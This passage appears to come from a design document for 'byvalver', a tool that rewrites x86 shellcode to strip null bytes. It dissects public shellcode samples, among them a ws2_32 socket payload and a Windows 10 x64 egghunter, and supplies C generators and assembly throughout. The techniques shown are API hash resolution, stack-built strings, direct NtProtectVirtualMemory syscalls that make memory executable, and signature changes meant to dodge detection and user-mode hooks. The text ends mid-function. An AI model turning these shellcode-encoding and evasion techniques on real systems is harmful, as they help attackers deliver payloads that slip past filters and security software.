        hash = (hash << 5) | (hash >> 27);    // ROL 5
    }

    return hash;
}
```

**Step 2: Verify Null-Free Hash Values**
```c
int is_hash_null_free(uint32_t hash) {
    uint8_t bytes[4];
    memcpy(bytes, &hash, 4);

    for (int i = 0; i < 4; i++) {
        if (bytes[i] == 0x00) return 0;
    }

    return 1;
}

void find_null_free_hash_variant(const char *function_name) {
    // Try different rotation amounts
    for (int rot = 1; rot < 32; rot++) {
        uint32_t hash = calculate_rol_n_hash(function_name, rot);

        if (is_hash_null_free(hash)) {
            printf("%s: ROL %d → 0x%08X (null-free)\n",
                   function_name, rot, hash);
        }
    }
}
```

**Step 3: Generate Hash Resolution Code**
```nasm
; Hash table on stack (32-bit values)
push  0xCAC999C0h      ; fopen hash
push  0x94202374h      ; LoadLibrary hash
push  0xD6086235h      ; ExitThread hash

; Resolution loop
mov   edx, [edi + 3ch]       ; PE header offset
mov   edx, [edi + edx + 78h] ; Export directory RVA
add   edx, edi               ; Convert to VA
push  edx                    ; Save export directory pointer

mov   edx, [edx + 20h]       ; Names table RVA
add   edx, edi               ; Convert to VA

xor   ebx, ebx               ; Function index = 0
GetImportAddressLoop:
inc   ebx                    ; Next function
mov   esi, [edx + ebx * 4]   ; Function name RVA
add   esi, edi               ; Convert to VA
xor   ecx, ecx               ; Initialize hash = 0
lodsb                        ; Load first character
GetImportHashLoop:
xor   ecx, eax               ; XOR hash with character
rol   ecx, 5                 ; Rotate left 5 bits
lodsb                        ; Load next character
test  al, al                 ; Null terminator?
jnz   GetImportHashLoop

mov   esi, [ebp]             ; Current hash table index
sub   ecx, [ebp + esi * 4]   ; Compare with target hash
jnz   GetImportAddressLoop   ; Not equal? Try next
```

**Step 4: Comparison with ROR13**

| Algorithm | Hash Size | Rotation | Collision Risk | Detection |
|-----------|-----------|----------|----------------|-----------|
| ROR13     | 32-bit    | ROR 13   | Low            | Well-known |
| ROR13-XOR | 8-bit     | None     | Medium         | Less known |
| ROL5      | 32-bit    | ROL 5    | Very Low       | Less known |
| ROL7      | 32-bit    | ROL 7    | Very Low       | Less known |

### Advantages
- **Flexibility**: Rotation amount can be tuned per shellcode
- **Larger hash space**: 32-bit hashes reduce collisions
- **Variable detection signature**: Using ROL 5 vs ROL 7 changes signature
- **Null-free hashes**: Can validate all hashes before deployment

### Considerations
- **Hash collision checking**: With 32-bit hashes, collisions are extremely rare but should be checked
- **Consistency**: All API names must hash without null bytes (check at generation time)
- **Algorithm selection**: Choose rotation amount that produces null-free hashes for your specific API list
- **Pattern recognition**: byvalver should not break these loops during transformation

### Code Generation for byvalver
```c
void generate_rol_n_hash_loop(struct buffer *b, int rotation) {
    // XOR ECX, EAX
    buffer_append_byte(b, 0x31);
    buffer_append_byte(b, 0xC1);

    // ROL ECX, rotation
    if (rotation == 1) {
        buffer_append_byte(b, 0xD1);
        buffer_append_byte(b, 0xC1);
    } else {
        buffer_append_byte(b, 0xC1);
        buffer_append_byte(b, 0xC1);
        buffer_append_byte(b, (uint8_t)rotation);
    }

    // LODSB
    buffer_append_byte(b, 0xAC);

    // TEST AL, AL
    buffer_append_byte(b, 0x84);
    buffer_append_byte(b, 0xC0);

    // JNZ (back to start of loop)
    buffer_append_byte(b, 0x75);
    buffer_append_byte(b, (uint8_t)(-10));  // Offset back to XOR instruction
}
```

### Recommended Usage
- Use ROL5 for 32-bit shellcode
- Use ROR13 for compatibility with Metasploit frameworks
- Use custom rotation (ROL7, ROL11) for unique signatures
- Always validate hash table for null bytes before deployment

---

## [Windows] SALC Instruction for Zero Register
**Source**: 13504.asm (line 79)
**Technique Category**: Register Manipulation, Opcode Optimization
**Priority**: MEDIUM

### Description
SALC (Set AL on Carry) is an undocumented x86 instruction that sets AL based on the carry flag:
```
SALC: AL = (CF) ? 0xFF : 0x00
```

In 13504.asm, it's used as a compact way to zero AL:
```nasm
SALC                ; If CF=0, AL = 0x00
```

Compared to alternatives:
```nasm
; SALC: 1 byte (0xD6)
salc                ; D6

; XOR: 2 bytes
xor al, al          ; 30 C0

; MOV: 2 bytes
mov al, 0           ; B0 00 (has null byte!)
```

### Implementation Approach

**Step 1: Detect Zeroing Operations**
```c
int can_use_salc_for_zeroing(cs_insn *insn) {
    // Check for: XOR AL, AL or MOV AL, 0
    if (insn->id == X86_INS_XOR) {
        cs_x86 *x86 = &insn->detail->x86;
        if (x86->op_count == 2 &&
            x86->operands[0].type == X86_OP_REG &&
            x86->operands[0].reg == X86_REG_AL &&
            x86->operands[1].type == X86_OP_REG &&
            x86->operands[1].reg == X86_REG_AL) {
            return 1;
        }
    } else if (insn->id == X86_INS_MOV) {
        cs_x86 *x86 = &insn->detail->x86;
        if (x86->op_count == 2 &&
            x86->operands[0].type == X86_OP_REG &&
            x86->operands[0].reg == X86_REG_AL &&
            x86->operands[1].type == X86_OP_IMM &&
            x86->operands[1].imm == 0) {
            return 1;
        }
    }

    return 0;
}
```

**Step 2: Ensure Carry Flag is Clear**

SALC requires CF=0 to zero AL. Check preceding instructions:
```c
int is_carry_flag_clear(cs_insn *prev_insn) {
    // Instructions that clear CF:
    // - CLC
    // - CMP (when result is equal or greater)
    // - SUB (when result is non-negative)
    // - XOR (always clears CF)
    // - OR (always clears CF)
    // - AND (always clears CF)

    if (prev_insn == NULL) return 0;  // Unknown state

    switch (prev_insn->id) {
        case X86_INS_CLC:
        case X86_INS_XOR:
        case X86_INS_OR:
        case X86_INS_AND:
            return 1;

        case X86_INS_CMP:
        case X86_INS_SUB:
            // Depends on operands - conservative: assume false
            return 0;

        default:
            return 0;
    }
}
```

**Step 3: Generate SALC or Prepare CF**
```c
void generate_salc_zeroing(struct buffer *b, cs_insn *insn, cs_insn *prev_insn) {
    if (!is_carry_flag_clear(prev_insn)) {
        // Ensure CF = 0
        buffer_append_byte(b, 0xF8);  // CLC instruction
    }

    // SALC
    buffer_append_byte(b, 0xD6);
}
```

**Alternative: Unconditional SALC Usage**
```nasm
; Always clear carry before SALC
clc                 ; F8 (1 byte)
salc                ; D6 (1 byte)
; Total: 2 bytes (same as XOR AL, AL)
```

### Advantages
- **Extremely compact**: 1 byte vs. 2 bytes for XOR
- **Null-free**: Opcode 0xD6 contains no nulls
- **No register dependencies**: Only depends on carry flag
- **Useful in tight loops**: Saves 1 byte per occurrence

### Considerations
- **Carry flag dependency**: Must ensure CF=0 or explicitly clear it
- **Undocumented instruction**: Not all disassemblers recognize SALC
- **x86-64 compatibility**: SALC is not valid in 64-bit mode (use only in 32-bit code)
- **Capstone support**: Check if Capstone correctly disassembles 0xD6

### Implementation in byvalver
```c
typedef enum {
    ARCH_X86_32,
    ARCH_X86_64
} architecture_t;

void generate_zero_al(struct buffer *b, architecture_t arch, cs_insn *prev_insn) {
    if (arch == ARCH_X86_32 && is_carry_flag_clear(prev_insn)) {
        // Use SALC (1 byte)
        buffer_append_byte(b, 0xD6);
    } else if (arch == ARCH_X86_32) {
        // CLC + SALC (2 bytes)
        buffer_append_byte(b, 0xF8);
        buffer_append_byte(b, 0xD6);
    } else {
        // x86-64: Use XOR AL, AL (2 bytes)
        buffer_append_byte(b, 0x30);
        buffer_append_byte(b, 0xC0);
    }
}
```

### Test Case
```nasm
; Original:
mov al, 0           ; B0 00 (has null byte)

; Replacement:
xor eax, eax        ; 31 C0 (clears EAX, sets CF=0)
salc                ; D6 (AL = 0)

; Or simply:
clc                 ; F8
salc                ; D6
```

---

## [Windows] REP STOSB for Memory Zeroing
**Source**: 13504.asm (line 80)
**Technique Category**: Memory Operations, Bulk Initialization
**Priority**: MEDIUM

### Description
The shellcode uses REP STOSB to efficiently zero a large memory region:
```nasm
MOV     ECX, 0x300          ; Count = 768 bytes
SUB     ESP, ECX            ; Allocate space
MOV     EDI, ESP            ; EDI = destination
SALC                        ; AL = 0
REP STOSB                   ; Zero 768 bytes
```

REP STOSB repeats STOSB (store AL at [EDI++]) ECX times. This is more compact than a loop.

**Comparison**:
```nasm
; REP STOSB: 2 bytes
rep stosb               ; F3 AA

; Loop equivalent: ~10 bytes
zero_loop:
    mov byte [edi], 0   ; C6 07 00 (has null!)
    inc edi             ; 47
    loop zero_loop      ; E2 FA
```

### Implementation Approach

**Step 1: Detect Memory Zeroing Loops**
```c
int can_use_rep_stosb(cs_insn *insn, size_t count) {
    // Pattern detection:
    // - Loop that writes 0 to consecutive addresses
    // - ECX register holds count
    // - EDI register holds address

    // Look for: MOV [EDI], 0 + INC EDI + LOOP pattern
    return detect_memory_fill_pattern(insn, count);
}
```

**Step 2: Generate REP STOSB Sequence**
```c
void generate_rep_stosb_zero(struct buffer *b, uint32_t count) {
    // Assume: EDI = destination, count in ECX

    // Ensure AL = 0 (use SALC or XOR)
    buffer_append_byte(b, 0xD6);  // SALC (assumes CF=0)

    // REP STOSB
    buffer_append_byte(b, 0xF3);  // REP prefix
    buffer_append_byte(b, 0xAA);  // STOSB opcode
}
```

**Step 3: Setup for REP STOSB**
```c
void generate_memory_zero_region(struct buffer *b, uint32_t address, uint32_t size) {
    // MOV EDI, address
    if (is_null_free(address)) {
        buffer_append_byte(b, 0xBF);
        buffer_append_dword_le(b, address);
    } else {
        generate_null_free_mov_edi(b, address);
    }

    // MOV ECX, size
    if (is_null_free(size)) {
        buffer_append_byte(b, 0xB9);
        buffer_append_dword_le(b, size);
    } else {
        generate_null_free_mov_ecx(b, size);
    }

    // Zero AL
    buffer_append_byte(b, 0xD6);  // SALC

    // REP STOSB
    buffer_append_byte(b, 0xF3);
    buffer_append_byte(b, 0xAA);
}
```

### Advantages
- **Extremely compact**: 2 bytes for the actual zeroing operation
- **Fast execution**: Optimized microcode on modern CPUs
- **Large regions**: Ideal for zeroing hundreds or thousands of bytes
- **Null-free**: REP STOSB opcode (F3 AA) contains no nulls

### Considerations
- **Register requirements**: Uses AL (value), EDI (destination), ECX (count)
- **Direction flag**: Assumes DF=0 (forward direction); if unsure, use CLD first
- **Alignment**: May be slower on unaligned addresses (CPU-dependent)
- **Count in ECX**: Must ensure ECX value is null-free

### Extended Usage: REP STOSD for Larger Values
```nasm
; Zero 4 bytes at a time
xor eax, eax            ; EAX = 0
mov ecx, 0x100          ; Count = 256 dwords (1024 bytes)
rep stosd               ; F3 AB
```

### Implementation in byvalver
```c
void optimize_memory_zeroing_loop(struct buffer *b, cs_insn *insn, size_t loop_size) {
    // Replace loop with REP STOSB
    // Assume: registers already set up (EDI, ECX)

    // CLD (ensure forward direction)
    buffer_append_byte(b, 0xFC);

    // Zero AL
    buffer_append_byte(b, 0xD6);  // SALC

    // REP STOSB
    buffer_append_byte(b, 0xF3);
    buffer_append_byte(b, 0xAA);
}
```

### Test Case
```nasm
; Original loop (has null byte in MOV):
mov ecx, 0x300
zero_loop:
    mov byte [edi], 0   ; C6 07 00
    inc edi
    loop zero_loop

; Optimized with REP STOSB:
mov ecx, 0x300          ; Set count
salc                    ; AL = 0
rep stosb               ; Zero memory
```

---

## [Windows] Stack-Based String Construction
**Source**: 13504.asm (lines 63-64), 13516.asm (lines 107-112)
**Technique Category**: Data Embedding, String Construction
**Priority**: HIGH

### Description
Instead of storing strings in a data section (which would introduce null terminators), shellcode constructs strings on the stack using PUSH instructions:

```nasm
; From 13504.asm:
PUSH    ECX                         ; Push 0x00000000 (null terminator)
PUSH    B2DW('2', '_', '3', '2')    ; Push "23_2"
PUSH    B2DW(hash1, hash2, 'w', 's') ; Push hashes + "ws"
; Result: "ws2_32\0" on stack
```

```nasm
; From 13516.asm (path string):
push ecx                ; Null terminator
push 'exe.'             ; Push ".exe" backwards
push 'xxx.'             ; Push "xxx."
; Result: ".xxxexe\0" (actually: "xxx.exe\0" when reversed)
```

The macro `B2DW(b1, b2, b3, b4)` packs bytes into a dword:
```c
#define B2DW(b1,b2,b3,b4) (((b4) << 24) + ((b3) << 16) + ((b2) << 8) + (b1))
```

### Implementation Approach

**Step 1: String-to-PUSH Conversion**
```c
void generate_push_string(struct buffer *b, const char *str) {
    size_t len = strlen(str);

    // Align to 4-byte boundary and add null terminator
    size_t padded_len = (len + 4) & ~3;  // Round up to multiple of 4

    char *padded = calloc(padded_len, 1);
    strcpy(padded, str);

    // Push in reverse order (stack grows down)
    for (int i = padded_len - 4; i >= 0; i -= 4) {
        uint32_t dword = *(uint32_t*)(padded + i);

        if (has_null_byte(dword)) {
            // Handle null bytes in the dword
            generate_null_free_push_dword(b, dword);
        } else {
            // Direct PUSH
            buffer_append_byte(b, 0x68);  // PUSH imm32
            buffer_append_dword_le(b, dword);
        }
    }

    free(padded);
}
```

**Step 2: Null-Free PUSH for Dwords Containing Nulls**
```c
void generate_null_free_push_dword(struct buffer *b, uint32_t value) {
    if (value == 0) {
        // PUSH 0: use XOR + PUSH
        buffer_append_byte(b, 0x31);  // XOR ECX, ECX
        buffer_append_byte(b, 0xC9);
        buffer_append_byte(b, 0x51);  // PUSH ECX
    } else {
        // Construct value in register, then PUSH
        generate_null_free_mov_ecx(b, value);
        buffer_append_byte(b, 0x51);  // PUSH ECX
    }
}
```

**Step 3: Mixed Data/String Construction**

From 13504.asm, the hash table + string combo:
```nasm
PUSH    ECX                         ; 0x00000000
PUSH    0x32335F32                  ; "23_2" (in hex)
PUSH    0x73774466                  ; hash=0x66, hash=0x56, hash=0x77, 's'
```

This is implemented as:
```c
void generate_hash_table_with_string(struct buffer *b, uint8_t *hashes, size_t hash_count, const char *dll_name) {
    // Push null terminator
    buffer_append_byte(b, 0x31);  // XOR ECX, ECX
    buffer_append_byte(b, 0xC9);
    buffer_append_byte(b, 0x51);  // PUSH ECX

    // Push DLL name
    generate_push_string(b, dll_name);

    // Push hashes (pack 4 hashes per dword)
    for (int i = hash_count - 1; i >= 0; i -= 4) {
        uint32_t dword = 0;
        for (int j = 0; j < 4 && (i - j) >= 0; j++) {
            dword |= ((uint32_t)hashes[i - j]) << (j * 8);
        }

        buffer_append_byte(b, 0x68);  // PUSH
        buffer_append_dword_le(b, dword);
    }
}
```

### Advantages
- **Position-independent**: Strings are constructed at runtime, not stored in data section
- **Compact**: Multiple characters per PUSH instruction
- **Null-terminator handling**: Explicit null terminator push (XOR + PUSH)
- **Flexible**: Can mix strings, hashes, and other data

### Considerations
- **Stack alignment**: Strings should be aligned to 4-byte boundaries
- **Byte order**: x86 is little-endian; bytes are reversed in dword
- **Null bytes in string**: If the string itself contains null bytes, must handle specially
- **Register usage**: ESP points to the constructed string after PUSHes

### Implementation in byvalver
```c
void recognize_string_construction(cs_insn *insn, size_t count) {
    // Pattern: Multiple PUSH instructions followed by ESP usage
    // Example:
    // PUSH 0x....
    // PUSH 0x....
    // MOV EAX, ESP   <- EAX now points to string

    // byvalver should preserve this pattern and only transform individual PUSH immediates
    // if they contain null bytes
}
```

### Test Implementation
```c
void test_string_push(void) {
    struct buffer b = {0};

    generate_push_string(&b, "ws2_32");

    // Expected output:
    // XOR ECX, ECX     ; 31 C9
    // PUSH ECX         ; 51
    // PUSH 0x32335F32  ; 68 32 5F 33 32 ("2_32" in little-endian)
    // PUSH 0x00007377  ; 68 77 73 00 00 ("ws" + padding)

    // Stack layout after: "ws2_32\0"
}
```

### Edge Case: Null Bytes in String Content
```c
void generate_push_string_with_nulls(struct buffer *b, const uint8_t *data, size_t len) {
    // For data that contains null bytes (e.g., wide strings)
    for (int i = len - 1; i >= 0; i -= 4) {
        uint32_t dword = 0;
        for (int j = 0; j < 4 && (i - j) >= 0; j++) {
            dword |= ((uint32_t)data[i - j]) << (j * 8);
        }

        // Always use null-free push
        generate_null_free_push_dword(b, dword);
    }
}
```

---

## [Windows] Syscall Direct Invocation (x64)
**Source**: 41827.asm (Windows 10 x64 egghunter, lines 26-28)
**Technique Category**: System Call, Direct Kernel Access
**Priority**: HIGH (x64 specific)

### Description
Instead of calling Win32 APIs (which requires API resolution), advanced shellcode can invoke syscalls directly:

```nasm
; From 41827.asm:
push 0x50                   ; Syscall number for NtProtectVirtualMemory (Windows 10 x64)
pop rax
syscall                     ; Execute syscall
```

This bypasses:
- API hash resolution
- Import table walking
- DLL dependency

**Syscall numbers by Windows version:**
- Windows 7 x64: NtProtectVirtualMemory = 0x4D
- Windows 10 x64: NtProtectVirtualMemory = 0x50
- Windows 11 x64: NtProtectVirtualMemory = 0x50

### Implementation Approach

**Step 1: Syscall Number Database**
```c
typedef struct {
    const char *name;
    uint16_t win7_x64;
    uint16_t win10_x64;
    uint16_t win11_x64;
} syscall_info_t;

syscall_info_t syscall_table[] = {
    {"NtProtectVirtualMemory", 0x4D, 0x50, 0x50},
    {"NtAllocateVirtualMemory", 0x15, 0x18, 0x18},
    {"NtCreateThreadEx", 0xA5, 0xBD, 0xC1},
    {"NtWriteVirtualMemory", 0x37, 0x3A, 0x3A},
    // ... more syscalls
};
```

**Step 2: Detect Syscall Instructions**
```c
int is_direct_syscall(cs_insn *insn) {
    if (insn->id == X86_INS_SYSCALL) {
        return 1;
    }

    // Alternative: detect CALL [kernel_function] where kernel_function
    // is known to be a syscall wrapper
    return 0;
}
```

**Step 3: Generate Syscall Invocation**
```c
void generate_syscall(struct buffer *b, const char *syscall_name, const char *target_os) {
    // Look up syscall number
    uint16_t syscall_num = lookup_syscall_number(syscall_name, target_os);

    if (syscall_num == 0 || has_null_byte_word(syscall_num)) {
        fprintf(stderr, "Warning: Syscall %s has null bytes or is unknown\n", syscall_name);
        return;
    }

    // PUSH syscall_number
    buffer_append_byte(b, 0x6A);  // PUSH imm8 (if fits in byte)
    buffer_append_byte(b, (uint8_t)syscall_num);

    // POP RAX
    buffer_append_byte(b, 0x58);

    // SYSCALL
    buffer_append_byte(b, 0x0F);
    buffer_append_byte(b, 0x05);
}
```

**Step 4: Parameter Setup (x64 Calling Convention)**

Windows x64 syscalls use the following calling convention:
- RAX = syscall number
- RCX = parameter 1
- RDX = parameter 2
- R8 = parameter 3
- R9 = parameter 4
- R10 = parameter 5 (not RCX!)
- Stack = parameters 6+

Example from 41827.asm:
```nasm
mov r9b, 0x40           ; Param 3: PAGE_EXECUTE_READWRITE
push rsp
pop rdx                 ; Param 2: pointer to lpAddress
push 0x08
push rsp
pop r8                  ; Param 3: pointer to dwSize
mov [rdx+0x20], rsp     ; Param 4: lpflOldProtect
dec r10                 ; Param 5: hProcess = -1
push 0x50
pop rax                 ; Syscall number
syscall
```

### Advantages
- **No API resolution needed**: Eliminates hash tables and export table walking
- **Compact**: Direct syscall is 3 bytes (0F 05)
- **Faster**: No function call overhead
- **Stealthy**: Bypasses user-mode hooks

### Considerations
- **Version-specific**: Syscall numbers change between Windows versions
- **Compatibility**: Must detect Windows version at runtime or target specific version
- **Stability**: Direct syscalls may break compatibility with security software
- **Parameter setup**: Must follow exact calling convention
- **R10 vs RCX**: Windows syscalls use R10 for 5th parameter (unlike regular x64 fastcall)

### Version Detection Strategy
```nasm
; Detect Windows version via PEB
mov rax, gs:[0x60]          ; PEB address
mov eax, [rax + 0x118]      ; PEB.OSMajorVersion
cmp eax, 10                 ; Windows 10/11?
je use_win10_syscalls
jmp use_win7_syscalls

use_win10_syscalls:
    mov eax, 0x50           ; NtProtectVirtualMemory for Win10
    jmp do_syscall

use_win7_syscalls:
    mov eax, 0x4D           ; NtProtectVirtualMemory for Win7
    jmp do_syscall

do_syscall:
    syscall
```

### Implementation in byvalver
```c
void handle_syscall_instruction(struct buffer *b, cs_insn *insn) {
    // SYSCALL instruction is already null-free: 0F 05
    // Just copy it
    buffer_append_byte(b, 0x0F);
    buffer_append_byte(b, 0x05);
}

void optimize_syscall_number_load(struct buffer *b, uint16_t syscall_num) {
    // Ensure null-free loading of syscall number into RAX
    if (syscall_num <= 0x7F && is_null_free_byte(syscall_num)) {
        // PUSH byte + POP RAX (3 bytes)
        buffer_append_byte(b, 0x6A);
        buffer_append_byte(b, (uint8_t)syscall_num);
        buffer_append_byte(b, 0x58);  // POP RAX
    } else {
        // Construct value null-free
        generate_null_free_mov_rax(b, syscall_num);
    }
}
```

### Test Case
```nasm
; Original (potential nulls in immediate):
mov rax, 0x50               ; 48 C7 C0 50 00 00 00 (has nulls)
syscall

; Optimized:
push 0x50                   ; 6A 50
pop rax                     ; 58
syscall                     ; 0F 05
```

---

## [Windows] Register Preservation via XCHG
**Source**: 13504.asm (line 146, 158)
**Technique Category**: Register Management, Optimization
**Priority**: MEDIUM

### Description
The shellcode uses XCHG to save/restore register values without PUSH/POP:

```nasm
; From 13504.asm line 146:
XCHG    EAX, EBP            ; Save LoadLibrary return (ws2_32 base) in EBP

; From line 158:
XCHG    EAX, EBP            ; EBP = socket descriptor
```

XCHG is more compact than PUSH+POP when you have a free register:

```nasm
; XCHG: 1 byte (for register-register with EAX)
xchg eax, ebp               ; 95

; PUSH+POP: 2 bytes
push eax                    ; 50
pop ebp                     ; 5D
```

### Implementation Approach

**Step 1: Identify Free Register**
```c
uint8_t find_free_register_for_swap(cs_insn *insn, size_t lookahead) {
    // Analyze instructions to find a register that:
    // 1. Is not currently in use
    // 2. Won't be needed for several instructions
    // 3. Can be used as temporary storage

    uint8_t registers[] = {
        X86_REG_EBP, X86_REG_ESI, X86_REG_EDI,
        X86_REG_EBX, X86_REG_EDX, X86_REG_ECX
    };

    for (int i = 0; i < 6; i++) {
        if (is_register_free(insn, registers[i], lookahead)) {
            return registers[i];
        }
    }

    return 0;  // No free register
}
```

**Step 2: Generate XCHG**
```c
void generate_xchg(struct buffer *b, uint8_t reg1, uint8_t reg2) {
    // XCHG with EAX is single-byte (90-97)
    if (reg1 == X86_REG_EAX) {
        buffer_append_byte(b, 0x90 + get_register_index(reg2));
    } else if (reg2 == X86_REG_EAX) {
        buffer_append_byte(b, 0x90 + get_register_index(reg1));
    } else {
        // XCHG reg, reg (2 bytes: 87 ModR/M)
        buffer_append_byte(b, 0x87);
        buffer_append_byte(b, ModRM(3, reg1, reg2));
    }
}
```

**Step 3: Optimization Pattern**
```nasm
; Original sequence (needs to preserve EAX):
push eax                    ; 50
; ... code that modifies EAX ...
pop eax                     ; 58

; Optimized with XCHG (if EBP is free):
xchg eax, ebp               ; 95
; ... code that modifies EAX (now in EBP) ...
xchg eax, ebp               ; 95 (restore)
```

### Advantages
- **Compact**: 1 byte for XCHG EAX, reg (vs. 2 bytes for PUSH+POP)
- **No stack modification**: Doesn't change ESP
- **Bidirectional**: Same instruction restores the value
- **Null-free**: All XCHG opcodes are null-free

### Considerations
- **Register availability**: Need a free register for temporary storage
- **Value preservation**: Both registers' values are swapped (not just one saved)
- **Multiple XCHGs**: Swapping twice restores original values
- **Performance**: XCHG has implicit LOCK prefix on memory operands (avoid XCHG with memory)

### Implementation in byvalver
```c
void optimize_register_preservation(struct buffer *b, cs_insn *push_insn, cs_insn *pop_insn) {
    // Pattern: PUSH reg ... POP reg
    uint8_t reg = get_push_pop_register(push_insn, pop_insn);

    if (reg == 0) return;  // Not a PUSH/POP pair

    uint8_t free_reg = find_free_register_for_swap(push_insn,
                                                     pop_insn->address - push_insn->address);

    if (free_reg != 0) {
        // Use XCHG optimization
        generate_xchg(b, reg, free_reg);
        // Generate code between PUSH and POP
        // ...
        generate_xchg(b, reg, free_reg);  // Restore
    } else {
        // Keep PUSH/POP
        generate_push(b, reg);
        // ...
        generate_pop(b, reg);
    }
}
```

### Extended Usage: Three-Way Register Rotation
```nasm
; Rotate EAX → EBX → ECX → EAX
xchg eax, ebx               ; EAX ↔ EBX
xchg eax, ecx               ; EAX ↔ ECX
; Result: original EAX in ECX, original EBX in EAX, original ECX in EBX
```

### Test Case
```nasm
; Original:
call LoadLibraryA           ; Returns DLL base in EAX
push eax                    ; Save DLL base
; ... code ...
pop ebp                     ; Restore to EBP

; Optimized:
call LoadLibraryA           ; Returns DLL base in EAX
xchg eax, ebp               ; Save to EBP in 1 byte (95)
; ... code ...
xchg eax, ebp               ; Restore (95)
```

---

## [Windows] SCASD for Position-Independent Code
**Source**: 13516.asm (line 56)
**Technique Category**: Position-Independent Code, Pointer Arithmetic
**Priority**: MEDIUM

### Description
SCASD (Scan String Dword) is cleverly used for pointer arithmetic in shellcode:

```nasm
; From 13516.asm:
call OverImportHashes       ; CALL pushes return address (RIP)
dd hash_values...           ; Data immediately after CALL
OverImportHashes:
pop ebp                     ; EBP = pointer to hash table
; ... later ...
scasd                       ; EDI += 4 (skip current hash)
scasd                       ; EDI += 4 (skip next hash)
```

SCASD performs:
```
Compare EAX with DWORD [EDI]
EDI += 4
```

When the comparison result is ignored, SCASD becomes a compact "ADD EDI, 4":

```nasm
; SCASD: 1 byte
scasd                       ; AF

; ADD EDI, 4: 3 bytes
add edi, 4                  ; 83 C7 04 (or 81 C7 04 00 00 00 with nulls)
```

### Implementation Approach

**Step 1: Detect ADD EDI, imm Patterns**
```c
int can_use_scasd_for_add(cs_insn *insn) {
    // Check for: ADD EDI, 4 (or multiples of 4)
    if (insn->id != X86_INS_ADD) return 0;

    cs_x86 *x86 = &insn->detail->x86;
    if (x86->op_count != 2) return 0;

    if (x86->operands[0].type == X86_OP_REG &&
        x86->operands[0].reg == X86_REG_EDI &&
        x86->operands[1].type == X86_OP_IMM) {

        int64_t imm = x86->operands[1].imm;

        // Only optimize for multiples of 4
        if (imm > 0 && (imm % 4) == 0) {
            return 1;
        }
    }

    return 0;
}
```

**Step 2: Generate SCASD Sequence**
```c
void generate_scasd_add(struct buffer *b, uint32_t count) {
    // count = number of dwords to skip
    for (uint32_t i = 0; i < count; i++) {
        buffer_append_byte(b, 0xAF);  // SCASD
    }
}
```

**Step 3: Similar String Instructions**

| Instruction | Opcode | Effect | Size Increment |
|-------------|--------|--------|----------------|
| SCASB       | AE     | AL vs [EDI], EDI += 1 | 1 byte |
| SCASW       | 66 AF  | AX vs [EDI], EDI += 2 | 2 bytes |
| SCASD       | AF     | EAX vs [EDI], EDI += 4 | 4 bytes |
| LODSB       | AC     | AL = [ESI], ESI += 1 | 1 byte |
| LODSD       | AD     | EAX = [ESI], ESI += 4 | 4 bytes |

### Advantages
- **Extremely compact**: 1 byte per 4-byte increment
- **Null-free**: Opcode 0xAF contains no nulls
- **No flags preservation needed**: Comparison result is discarded
- **Works with any EAX value**: Comparison is not used

### Considerations
- **EDI-only**: Only works for incrementing EDI (or ESI with LODSD)
- **Fixed increment**: Can only increment by 4 (SCASD) or 1 (SCASB)
- **Flag side effects**: Modifies flags (ZF, CF, etc.) - ensure this doesn't break logic
- **Direction flag**: Assumes DF=0; if unsure, use CLD first

### Implementation in byvalver
```c
void optimize_pointer_increment(struct buffer *b, cs_insn *insn) {
    cs_x86 *x86 = &insn->detail->x86;
    uint8_t reg = x86->operands[0].reg;
    int64_t increment = x86->operands[1].imm;

    if (reg == X86_REG_EDI && (increment % 4) == 0) {
        // Use SCASD
        size_t count = increment / 4;
        for (size_t i = 0; i < count; i++) {
            buffer_append_byte(b, 0xAF);
        }
    } else if (reg == X86_REG_ESI && (increment % 4) == 0) {
        // Use LODSD
        size_t count = increment / 4;
        for (size_t i = 0; i < count; i++) {
            buffer_append_byte(b, 0xAD);
        }
    } else if (reg == X86_REG_EDI && (increment % 1) == 0) {
        // Use SCASB
        for (int64_t i = 0; i < increment; i++) {
            buffer_append_byte(b, 0xAE);
        }
    } else {
        // Fallback: use arithmetic
        generate_add_immediate(b, reg, increment);
    }
}
```

### Extended Usage: LODSD for Reading
```nasm
; LODSD loads dword from [ESI] and increments ESI
call get_data_address
data_table:
dd 0x12345678
dd 0x9ABCDEF0
get_data_address:
pop esi                     ; ESI = &data_table
lodsd                       ; EAX = 0x12345678, ESI += 4
lodsd                       ; EAX = 0x9ABCDEF0, ESI += 4
```

### Test Case
```nasm
; Original:
add edi, 8                  ; 83 C7 08 (3 bytes)

; Optimized:
scasd                       ; AF (1 byte)
scasd                       ; AF (1 byte)
; Total: 2 bytes vs. 3 bytes
```

---

## [Windows] MOV Immediate via Arithmetic Decomposition
**Source**: 13504.asm (line 162)
**Technique Category**: Immediate Value Construction, Arithmetic Encoding
**Priority**: HIGH

### Description
The shellcode uses arithmetic to construct immediate values without null bytes:

```nasm
; From line 162:
SUB     DWORD [EDI], -W2DW(AF_INET, B2W(port >> 8, port & 0xFF))
```

This is equivalent to:
```nasm
ADD     DWORD [EDI], W2DW(AF_INET, B2W(port >> 8, port & 0xFF))
```

By using SUB with negative value, the shellcode avoids direct ADD encoding which might contain nulls.

**Arithmetic equivalences:**
```
ADD X, Y  ≡  SUB X, -Y
SUB X, Y  ≡  ADD X, -Y
```

### Implementation Approach

**Step 1: Find Arithmetic Equivalents**
```c
int find_arithmetic_equivalent(int64_t target, int64_t *val1, int64_t *val2, int *operation) {
    // Try: target = val1 + val2
    for (int64_t v1 = 1; v1 < 0x1000; v1++) {
        int64_t v2 = target - v1;

        if (is_null_free(v1) && is_null_free(v2)) {
            *val1 = v1;
            *val2 = v2;
            *operation = X86_INS_ADD;
            return 1;
        }
    }

    // Try: target = val1 - val2
    for (int64_t v1 = target; v1 < target + 0x1000; v1++) {
        int64_t v2 = v1 - target;

        if (is_null_free(v1) && is_null_free(v2)) {
            *val1 = v1;
            *val2 = v2;
            *operation = X86_INS_SUB;
            return 1;
        }
    }

    return 0;  // No equivalent found
}
```

**Step 2: Generate Arithmetic Construction**
```c
void generate_arithmetic_mov(struct buffer *b, uint8_t reg, int64_t value) {
    int64_t val1, val2;
    int operation;

    if (find_arithmetic_equivalent(value, &val1, &val2, &operation)) {
        // Load base value
        generate_null_free_mov(b, reg, val1);

        if (operation == X86_INS_ADD) {
            // ADD reg, val2
            buffer_append_byte(b, 0x81);  // ADD r/m32, imm32
            buffer_append_byte(b, ModRM(3, 0, reg));
            buffer_append_dword_le(b, (uint32_t)val2);
        } else {
            // SUB reg, val2
            buffer_append_byte(b, 0x81);  // SUB r/m32, imm32
            buffer_append_byte(b, ModRM(3, 5, reg));
